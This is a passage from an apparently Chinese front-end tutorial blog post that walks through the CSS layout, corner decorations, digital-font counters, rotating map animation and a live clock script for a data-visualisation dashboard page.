class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* &#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="页面底部以及背景图设置"><a href="#页面底部以及背景图设置" class="headerlink" title="页面底部以及背景图设置"></a>页面底部以及背景图设置</h3><ul><li>引入背景图（覆盖整个页面）</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">'../images/bg.jpg'</span>) no-repeat top center;</span><br><span class="line">    <span class="comment">/* 覆盖整个页面 */</span></span><br><span class="line">    <span class="attribute">background-size</span>: cover;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="页面顶部导航条设置"><a href="#页面顶部导航条设置" class="headerlink" title="页面顶部导航条设置"></a>页面顶部导航条设置</h3><ol><li>高度为100px</li><li>背景图，在容器内显示</li><li>缩放比例为 100%</li><li>h1 标题部分   白色  38像素 居中显示  行高为 80像素</li><li>时间模块 showTime   定位右侧  right 为 30px   行高为 75px  文字颜色为：rgba(255, 255, 255, 0.7)     而文字大小为 20像素 </li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">header</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">'../images/head_bg.png'</span>) no-repeat top center;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">1.25rem</span>;</span><br><span class="line">    <span class="comment">/* 🔺缩放比例 100% */</span></span><br><span class="line">    <span class="attribute">background-size</span>: <span class="number">100%</span> <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">header</span> <span class="selector-tag">h1</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">0.475rem</span>;</span><br><span class="line">    <span class="comment">/* 文字居中 */</span></span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">1.0rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.showTime</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">right</span>: <span class="number">0.375rem</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">0.9375rem</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.7</span>);</span><br></pre></td></tr></table></figure><ul><li>这里的时间实时更新函数引用之前的js案例并相应修改，同时添加定时器（setInterval() 方法可按照指定的周期（以毫秒计）来调用函数或计算表达式）用来每隔指定时间调用该函数</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> formaDate = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>()</span><br><span class="line">    <span class="keyword">var</span> year = d.getFullYear(), <span class="comment">//多变量赋值</span></span><br><span class="line">        month = d.getMonth() + <span class="number">1</span>, <span class="comment">//month：从0开始</span></span><br><span class="line">        date = d.getDate(),</span><br><span class="line">        hour = d.getHours(),</span><br><span class="line">        minute = d.getMinutes(),</span><br><span class="line">        second = d.getSeconds();</span><br><span class="line"></span><br><span class="line">    year = year &lt; <span class="number">10</span> ? <span class="string">'0'</span> + year : year; <span class="comment">//三元操作符</span></span><br><span class="line">    month = month &lt; <span class="number">10</span> ? <span class="string">'0'</span> + month : month;</span><br><span class="line">    date = date &lt; <span class="number">10</span> ? <span class="string">'0'</span> + date : date;</span><br><span class="line">    hour = hour &lt; <span class="number">10</span> ? <span class="string">'0'</span> + hour : hour;</span><br><span class="line">    minute = minute &lt; <span class="number">10</span> ? <span class="string">'0'</span> + minute : minute;</span><br><span class="line">    second = second &lt; <span class="number">10</span> ? <span class="string">'0'</span> + second : second;</span><br><span class="line">    <span class="keyword">var</span> a = year + <span class="string">'-'</span> + month + <span class="string">'-'</span> + date + <span class="string">' '</span> + hour + <span class="string">':'</span> + minute + <span class="string">':'</span> + second</span><br><span class="line">    $(<span class="string">'.showTime'</span>).html(a);</span><br><span class="line">&#125;</span><br><span class="line">setInterval(formaDate, <span class="number">1000</span>) <span class="comment">//设定定时器，循环运行;</span></span><br></pre></td></tr></table></figure><h3 id="mainbox主体模块"><a href="#mainbox主体模块" class="headerlink" title="mainbox主体模块"></a>mainbox主体模块</h3><ol><li>需要一个上左右的10px 的内边距</li><li>column 列容器，分三列，占比 3：5：3</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.mainbox</span> &#123;</span><br><span class="line">    <span class="attribute">padding</span>:  <span class="number">0.125rem</span> <span class="number">0.125rem</span> <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">min-width</span>: <span class="number">1024px</span>;</span><br><span class="line">    <span class="attribute">max-width</span>: <span class="number">1920px</span>;</span><br><span class="line">    <span class="comment">/* background-color: lightpink; */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.column</span> &#123;</span><br><span class="line">    <span class="attribute">flex</span>: <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.column</span><span class="selector-pseudo">:nth-child(2)</span> &#123;</span><br><span class="line">    <span class="attribute">flex</span>: <span class="number">5</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">0.125rem</span> <span class="number">0.1875rem</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="公共面板模块-panel"><a href="#公共面板模块-panel" class="headerlink" title="公共面板模块 panel"></a>公共面板模块 panel</h3><p>设置放置图表的容器公共样式</p><ul><li>高度为 310px<ul><li>1像素的 1px solid rgba(25, 186, 139, 0.17)  边框</li><li>有line.jpg 背景图片</li><li>padding为  上为 0  左右 15px  下为 40px</li><li>下外边距是 15px</li><li>利用panel  盒子 before 和after 制作上面两个角   大小为 10px  线条为  2px solid #02a6b5</li><li>新加一个盒子before 和after   制作下侧两个角  宽度高度为 10px</li></ul></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.panel</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">3.875rem</span>;</span><br><span class="line">    <span class="comment">/* width: 100%; */</span></span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="built_in">rgba</span>(<span class="number">25</span>, <span class="number">186</span>, <span class="number">139</span>, <span class="number">0.17</span>);</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.04</span>) <span class="built_in">url</span>(<span class="string">'../images/line(1).png'</span>);</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">0.1875rem</span> <span class="number">0.5rem</span>;</span><br><span class="line">    <span class="attribute">margin-bottom</span>: <span class="number">0.1875rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.panel</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/* 要给内容 */</span></span><br><span class="line">    <span class="attribute">content</span>: <span class="string">""</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">border-top</span>: <span class="number">2px</span> solid <span class="number">#02a6b5</span>;</span><br><span class="line">    <span class="attribute">border-left</span>: <span class="number">2px</span> solid <span class="number">#02a6b5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.panel</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/* 要给内容 */</span></span><br><span class="line">    <span class="attribute">content</span>: <span class="string">""</span>;</span><br><span class="line">    <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">border-top</span>: <span class="number">2px</span> solid <span class="number">#02a6b5</span>;</span><br><span class="line">    <span class="attribute">border-right</span>: <span class="number">2px</span> solid <span class="number">#02a6b5</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.panelFooter</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/* background-color: pink; */</span></span><br><span class="line">    <span class="attribute">height</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.panelFooter</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/* 要给内容 */</span></span><br><span class="line">    <span class="attribute">content</span>: <span class="string">""</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">border-bottom</span>: <span class="number">2px</span> solid <span class="number">#02a6b5</span>;</span><br><span class="line">    <span class="attribute">border-left</span>: <span class="number">2px</span> solid <span class="number">#02a6b5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.panelFooter</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/* 要给内容 */</span></span><br><span class="line">    <span class="attribute">content</span>: <span class="string">""</span>;</span><br><span class="line">    <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">border-bottom</span>: <span class="number">2px</span> solid <span class="number">#02a6b5</span>;</span><br><span class="line">    <span class="attribute">border-right</span>: <span class="number">2px</span> solid <span class="number">#02a6b5</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="图表标题及图表布局"><a href="#图表标题及图表布局" class="headerlink" title="图表标题及图表布局"></a>图表标题及图表布局</h3><ul><li>标题模块  h2    高度为 48px   文字颜色为白色  文字大小为  20px  </li><li>图标内容模块  chart   高度 240px </li><li>以上可以作为panel公共样式部分 </li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.panel</span> <span class="selector-tag">h2</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">0.6rem</span>;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">0.6rem</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">0.25rem</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="attribute">font-weight</span>: <span class="number">400</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.panel</span> <span class="selector-class">.chart</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">3.0rem</span>;</span><br><span class="line">    <span class="comment">/* margin: 0 0.1875rem; */</span></span><br><span class="line">    <span class="attribute">background-color</span>: pink;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="中间布局"><a href="#中间布局" class="headerlink" title="中间布局"></a>中间布局</h3><ul><li><p>上面是no 数字模块</p></li><li><p>下面是map 地图模块</p></li><li><p>字体声明</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 声明字体*/</span></span><br><span class="line"><span class="keyword">@font-face</span> &#123;</span><br><span class="line">  <span class="attribute">font-family</span>: electronicFont;</span><br><span class="line">  <span class="attribute">src</span>: <span class="built_in">url</span>(../font/DS-DIGIT.TTF);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ol><li>数字模块 no  有个背景颜色  rgba(101, 132, 226, 0.1);  有个15像素的内边距</li><li>注意中间列 column 有个 左右 10px 下 15px 的外边距</li><li>no 模块里面上下划分  上面是数字（no-hd)   下面 是 相关文字说明(no-bd)</li><li>no-hd 数字模块   有一个边框 1px solid rgba(25, 186, 139, 0.17)    </li><li>no-hd 数字模块 里面分为两个小li  每个小li高度为 80px   文字大小为   70px   颜色为 #ffeb7b   字体是图标字体  electronicFont</li><li>no-hd 利用 after 和 before制作2个小角，  边框  2px solid #02a6b5  宽度为 30px  高度为 10px</li><li>小竖线 给 第一个小li after 就可以  1px宽 背景颜色为 rgba(255, 255, 255, 0.2);     高度 50%  top 25% 即可</li><li>no-bd 里面也有两个小li  高度为 40px   文字颜色为  rgba(255, 255, 255, 0.7)   文字大小为 18px   上内边距为  10px</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.no</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">101</span>, <span class="number">132</span>, <span class="number">226</span>, <span class="number">0.1</span>);</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0.1875rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.no-hd</span> &#123;</span><br><span class="line"><span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="built_in">rgba</span>(<span class="number">25</span>, <span class="number">186</span>, <span class="number">139</span>, <span class="number">0.17</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.no-hd</span><span class="selector-pseudo">::before</span>&#123;</span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line"><span class="attribute">content</span>: <span class="string">" "</span>;</span><br><span class="line"><span class="attribute">border-top</span>: <span class="number">2px</span> solid <span class="number">#02a6b5</span>;</span><br><span class="line"><span class="attribute">border-left</span>: <span class="number">2px</span> solid <span class="number">#02a6b5</span>;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">0.375rem</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">0.125rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.no-hd</span><span class="selector-pseudo">::after</span>&#123;</span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line"><span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line"><span class="attribute">content</span>: <span class="string">" "</span>;</span><br><span class="line"><span class="attribute">border-bottom</span>: <span class="number">2px</span> solid <span class="number">#02a6b5</span>;</span><br><span class="line"><span class="attribute">border-right</span>: <span class="number">2px</span> solid <span class="number">#02a6b5</span>;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">0.375rem</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">0.125rem</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.no-hd</span> <span class="selector-tag">ul</span> &#123;</span><br><span class="line"><span class="attribute">display</span>: flex;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.no-hd</span> <span class="selector-tag">ul</span> <span class="selector-tag">li</span> &#123;</span><br><span class="line"><span class="attribute">position</span>: relative;</span><br><span class="line"><span class="attribute">flex</span>: <span class="number">1</span>;</span><br><span class="line"><span class="attribute">font-size</span>: <span class="number">0.875rem</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">1.0rem</span>;</span><br><span class="line"><span class="attribute">text-align</span>: center;</span><br><span class="line"><span class="attribute">color</span>: <span class="number">#ffeb7b</span>;</span><br><span class="line"><span class="attribute">font-family</span>: electronicFont;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.no-hd</span> <span class="selector-tag">ul</span> <span class="selector-tag">li</span><span class="selector-pseudo">:nth-child(1)</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line"><span class="attribute">content</span>: <span class="string">""</span>;</span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">top</span>: <span class="number">25%</span>;</span><br><span class="line"><span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line"><span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.2</span>);</span><br><span class="line"><span class="attribute">width</span>: <span class="number">1px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">50%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.no-bd</span> <span class="selector-tag">ul</span> &#123;</span><br><span class="line"><span class="attribute">display</span>: flex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.no-bd</span> <span class="selector-tag">ul</span> <span class="selector-tag">li</span> &#123;</span><br><span class="line"><span class="attribute">flex</span>: <span class="number">1</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">0.5rem</span>;</span><br><span class="line"><span class="attribute">color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.7</span>);</span><br><span class="line"><span class="attribute">font-size</span>: <span class="number">0.225rem</span>;</span><br><span class="line"><span class="attribute">padding-top</span>: <span class="number">0.125rem</span>;</span><br><span class="line"><span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="地图模块（css动画）"><a href="#地图模块（css动画）" class="headerlink" title="地图模块（css动画）"></a>地图模块（css动画）</h4><ol><li>地图模块高度为 810px  里面包含4个盒子  chart、 放图表模块、球体盒子、旋转1、旋转2  </li><li>球体图片模块 map1    大小为 518px  要加背景图片 因为要缩放100%     <strong>定位到最中央</strong>    透明度 .3   </li><li>旋转1  map 2    大小为 643px 要加背景图片 因为要缩放100%    <strong>定位到中央</strong>  透明度  .6   做旋转动画</li><li>旋转2  map3  大小为 566px  要加背景图片 因为要缩放100%    <strong>定位到中央</strong> 旋转动画 注意是逆时针 </li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.map</span> &#123;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">10.125rem</span>;</span><br><span class="line"><span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.map</span> <span class="selector-class">.map1</span> &#123;</span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">6.475rem</span>;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">6.475rem</span>;</span><br><span class="line"><span class="attribute">opacity</span>: <span class="number">0.3</span>;</span><br><span class="line"><span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">50%</span>, -<span class="number">50%</span>);</span><br><span class="line"><span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">'../images/map.png'</span>) no-repeat;</span><br><span class="line"><span class="attribute">background-size</span>: <span class="number">100%</span> <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.map</span> <span class="selector-class">.map2</span> &#123;</span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">6.475rem</span>;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">6.475rem</span>;</span><br><span class="line"><span class="comment">/* opacity: 0.3; */</span></span><br><span class="line"><span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">50%</span>, -<span class="number">50%</span>);</span><br><span class="line"><span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">'../images/lbx.png'</span>) no-repeat;</span><br><span class="line"><span class="attribute">background-size</span>: <span class="number">100%</span> <span class="number">100%</span>;</span><br><span class="line"><span class="attribute">animation</span>: rotate <span class="number">15s</span> linear infinite;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.map</span> <span class="selector-class">.map3</span> &#123;</span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">6.475rem</span>;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">6.475rem</span>;</span><br><span class="line"><span class="comment">/* opacity: 0.3; */</span></span><br><span class="line"><span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">translate</span>(-<span class="number">50%</span>, -<span class="number">50%</span>);</span><br><span class="line"><span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">'../images/jt.png'</span>) no-repeat;</span><br><span class="line"><span class="attribute">background-size</span>: <span class="number">100%</span> <span class="number">100%</span>;</span><br><span class="line"><span class="attribute">animation</span>: rotate1 <span class="number">10s</span> linear infinite;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.map</span> <span class="selector-class">.chart</span> &#123;</span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line"><span class="attribute">left</span>: <span 